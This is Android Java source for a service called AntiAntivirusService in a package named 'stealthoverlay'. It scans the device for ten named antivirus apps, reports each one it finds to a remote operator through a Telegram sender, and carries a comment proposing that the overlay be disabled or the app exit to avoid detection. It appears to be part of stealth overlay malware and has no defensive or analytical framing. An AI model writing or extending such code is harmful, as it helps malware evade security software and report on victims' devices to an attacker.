package com.example.stealthoverlay;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;

public class AntiAntivirusService extends Service {

    // List of known antivirus package names
    private final String[] antivirusApps = {
        "com.avast.android.mobilesecurity",
        "com.avg.android",
        "com.bitdefender.antivirus",
        "com.kms.free",
        "com.symantec.mobilesecurity",
        "com.mcafee.android",
        "com.kaspersky.qrcode",
        "com.lookout",
        "com.eset.ems2.gp",
        "com.psafe.msuite"
    };

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        for (String pkg : antivirusApps) {
            if (isPackageInstalled(pkg, this)) {
                TelegramSender.send("⚠️ Antivirus detected: " + pkg);
                // Optional: take action here (e.g., disable overlay or exit)
            }
        }
        return START_NOT_STICKY;
    }

    private boolean isPackageInstalled(String packageName, Context context) {
        PackageManager pm = context.getPackageManager();
        try {
            pm.getPackageInfo(packageName, PackageManager.GET_ACTIVITIES);
            return true;
        } catch (PackageManager.NameNotFoundException e) {
            return false;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
